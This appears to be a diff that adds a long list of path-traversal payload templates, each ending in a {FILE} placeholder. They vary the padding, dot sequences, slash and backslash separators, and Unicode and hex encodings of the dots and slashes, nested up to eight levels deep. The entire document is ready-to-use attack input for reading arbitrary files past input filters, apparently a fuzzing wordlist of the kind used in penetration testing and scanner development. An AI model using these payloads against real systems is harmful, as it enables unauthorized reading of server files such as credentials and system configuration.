AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\..\..\..\{FILE}
+- AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\..\..\..\..\{FILE}
+- AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\..\..\..\..\..\{FILE}
+- AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\..\..\..\..\..\..\{FILE}
+- AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\..\..\..\..\..\..\..\{FILE}
+- AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\..\..\..\..\..\..\..\..\{FILE}
+- AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../{FILE}
+- AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../{FILE}
+- AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../{FILE}
+- AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../{FILE}
+- AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../{FILE}
+- AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../../{FILE}
+- AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../../../{FILE}
+- AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../../../../{FILE}
+- AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\..\{FILE}
+- AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\..\..\{FILE}
+- AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\..\..\..\{FILE}
+- AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\..\..\..\..\{FILE}
+- AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\..\..\..\..\..\{FILE}
+- AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\..\..\..\..\..\..\{FILE}
+- AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\..\..\..\..\..\..\..\{FILE}
+- AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\..\..\..\..\..\..\..\..\{FILE}
+- '.../{FILE}'
+- '.../.../{FILE}'
+- '.../.../.../{FILE}'
+- '.../.../.../.../{FILE}'
+- '.../.../.../.../.../{FILE}'
+- '.../.../.../.../.../.../{FILE}'
+- '.../.../.../.../.../.../.../{FILE}'
+- '.../.../.../.../.../.../.../.../{FILE}'
+- '...\{FILE}'
+- '...\...\{FILE}'
+- '...\...\...\{FILE}'
+- '...\...\...\...\{FILE}'
+- '...\...\...\...\...\{FILE}'
+- '...\...\...\...\...\...\{FILE}'
+- '...\...\...\...\...\...\...\{FILE}'
+- '...\...\...\...\...\...\...\...\{FILE}'
+- '..../{FILE}'
+- '..../..../{FILE}'
+- '..../..../..../{FILE}'
+- '..../..../..../..../{FILE}'
+- '..../..../..../..../..../{FILE}'
+- '..../..../..../..../..../..../{FILE}'
+- '..../..../..../..../..../..../..../{FILE}'
+- '..../..../..../..../..../..../..../..../{FILE}'
+- '....\{FILE}'
+- '....\....\{FILE}'
+- '....\....\....\{FILE}'
+- '....\....\....\....\{FILE}'
+- '....\....\....\....\....\{FILE}'
+- '....\....\....\....\....\....\{FILE}'
+- '....\....\....\....\....\....\....\{FILE}'
+- '....\....\....\....\....\....\....\....\{FILE}'
+- '........................................................................../{FILE}'
+- '........................................................................../../{FILE}'
+- '........................................................................../../../{FILE}'
+- '........................................................................../../../../{FILE}'
+- '........................................................................../../../../../{FILE}'
+- '........................................................................../../../../../../{FILE}'
+- '........................................................................../../../../../../../{FILE}'
+- '........................................................................../../../../../../../../{FILE}'
+- '..........................................................................\{FILE}'
+- '..........................................................................\..\{FILE}'
+- '..........................................................................\..\..\{FILE}'
+- '..........................................................................\..\..\..\{FILE}'
+- '..........................................................................\..\..\..\..\{FILE}'
+- '..........................................................................\..\..\..\..\..\{FILE}'
+- '..........................................................................\..\..\..\..\..\..\{FILE}'
+- '..........................................................................\..\..\..\..\..\..\..\{FILE}'
+- ..%u2215{FILE}
+- ..%u2215..%u2215{FILE}
+- ..%u2215..%u2215..%u2215{FILE}
+- ..%u2215..%u2215..%u2215..%u2215{FILE}
+- ..%u2215..%u2215..%u2215..%u2215..%u2215{FILE}
+- ..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215{FILE}
+- ..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215{FILE}
+- ..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215{FILE}
+- '%uff0e%uff0e/{FILE}'
+- '%uff0e%uff0e/%uff0e%uff0e/{FILE}'
+- '%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/{FILE}'
+- '%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/{FILE}'
+- '%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/{FILE}'
+- '%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/{FILE}'
+- '%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/{FILE}'
+- '%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/{FILE}'
+- '%uff0e%uff0e%u2215{FILE}'
+- '%uff0e%uff0e%u2215%uff0e%uff0e%u2215{FILE}'
+- '%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215{FILE}'
+- '%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215{FILE}'
+- '%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215{FILE}'
+- '%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215{FILE}'
+- '%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215{FILE}'
+- '%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215{FILE}'
+- ..%u2216{FILE}
+- ..%u2216..%u2216{FILE}
+- ..%u2216..%u2216..%u2216{FILE}
+- ..%u2216..%u2216..%u2216..%u2216{FILE}
+- ..%u2216..%u2216..%u2216..%u2216..%u2216{FILE}
+- ..%u2216..%u2216..%u2216..%u2216..%u2216..%u2216{FILE}
+- ..%u2216..%u2216..%u2216..%u2216..%u2216..%u2216..%u2216{FILE}
+- ..%u2216..%u2216..%u2216..%u2216..%u2216..%u2216..%u2216..%u2216{FILE}
+- ..%uEFC8{FILE}
+- ..%uEFC8..%uEFC8{FILE}
+- ..%uEFC8..%uEFC8..%uEFC8{FILE}
+- ..%uEFC8..%uEFC8..%uEFC8..%uEFC8{FILE}
+- ..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8{FILE}
+- ..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8{FILE}
+- ..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8{FILE}
+- ..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8{FILE}
+- ..%uF025{FILE}
+- ..%uF025..%uF025{FILE}
+- ..%uF025..%uF025..%uF025{FILE}
+- ..%uF025..%uF025..%uF025..%uF025{FILE}
+- ..%uF025..%uF025..%uF025..%uF025..%uF025{FILE}
+- ..%uF025..%uF025..%uF025..%uF025..%uF025..%uF025{FILE}
+- ..%uF025..%uF025..%uF025..%uF025..%uF025..%uF025..%uF025{FILE}
+- ..%uF025..%uF025..%uF025..%uF025..%uF025..%uF025..%uF025..%uF025{FILE}
+- '%uff0e%uff0e\{FILE}'
+- '%uff0e%uff0e\%uff0e%uff0e\{FILE}'
+- '%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\{FILE}'
+- '%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\{FILE}'
+- '%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\{FILE}'
+- '%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\{FILE}'
+- '%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\{FILE}'
+- '%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\{FILE}'
+- '%uff0e%uff0e%u2216{FILE}'
+- '%uff0e%uff0e%u2216%uff0e%uff0e%u2216{FILE}'
+- '%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216{FILE}'
+- '%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216{FILE}'
+- '%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216{FILE}'
+- '%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216{FILE}'
+- '%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216{FILE}'
+- '%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216{FILE}'
+- ..0x2f{FILE}
+- ..0x2f..0x2f{FILE}
+- ..0x2f..0x2f..0x2f{FILE}
+- ..0x2f..0x2f..0x2f..0x2f{FILE}
+- ..0x2f..0x2f..0x2f..0x2f..0x2f{FILE}
+- ..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f{FILE}
+- ..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f{FILE}
+- ..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f{FILE}
+- 0x2e0x2e/{FILE}
+- 0x2e0x2e/0x2e0x2e/{FILE}
+- 0x2e0x2e/0x2e0x2e/0x2e0x2e/{FILE}
+- 0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/{FILE}
+- 0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/{FILE}
+- 0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/{FILE}
+- 0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/{FILE}
+- 0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/{FILE}
+- 0x2e0x2e0x2f{FILE}
+- 0x2e0x2e0x2f0x2e0x2e0x2f{FILE}
+- 0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f{FILE}
+- 0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f{FILE}
